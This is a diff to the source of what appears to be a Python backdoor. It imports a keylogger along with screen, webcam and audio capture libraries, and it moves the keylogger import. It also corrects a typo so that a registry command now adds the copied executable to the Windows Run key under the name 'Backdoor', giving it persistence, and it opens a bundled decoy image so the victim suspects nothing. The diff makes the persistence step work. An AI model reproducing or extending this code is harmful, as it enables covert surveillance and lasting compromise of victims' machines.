@@ -15,12 +15,11 @@ import webbrowser
 
 import cv2
 import imutils
+import keylogger
 import mss
 import requests
 import sounddevice
 from scipy.io.wavfile import write
-
-import keylogger
 
 # def reliable_send(data):
 #     try:
@@ -317,7 +316,7 @@ def shell():
             if not os.path.exists(location):
                 shutil.copyfile(sys.executable, location)
                 subprocess.call(
-                    'reg add HKCU\Software\Microsoft\Windows\CurrentVirsion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)
+                    'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)
                 name = sys._MEIPASS + "\hinata.jpg"
                 try:
                     subprocess.Popen(name, shell=True)
